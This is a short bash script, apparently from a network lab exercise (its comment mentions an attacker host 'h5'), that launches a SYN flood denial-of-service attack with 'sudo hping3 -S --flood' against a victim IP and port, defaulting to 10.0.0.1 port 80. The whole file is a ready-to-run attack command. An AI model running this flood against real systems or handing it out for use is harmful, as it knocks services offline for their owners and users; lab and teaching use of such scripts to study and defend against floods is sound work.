#!/bin/bash
# SYN flood attack - run from attacker host xterm (e.g. h5)
# Usage: ./syn_flood.sh <victim_ip> <port>
VICTIM=${1:-10.0.0.1}
PORT=${2:-80}
echo "Launching SYN flood against $VICTIM:$PORT ..."
sudo hping3 -S --flood -p $PORT $VICTIM
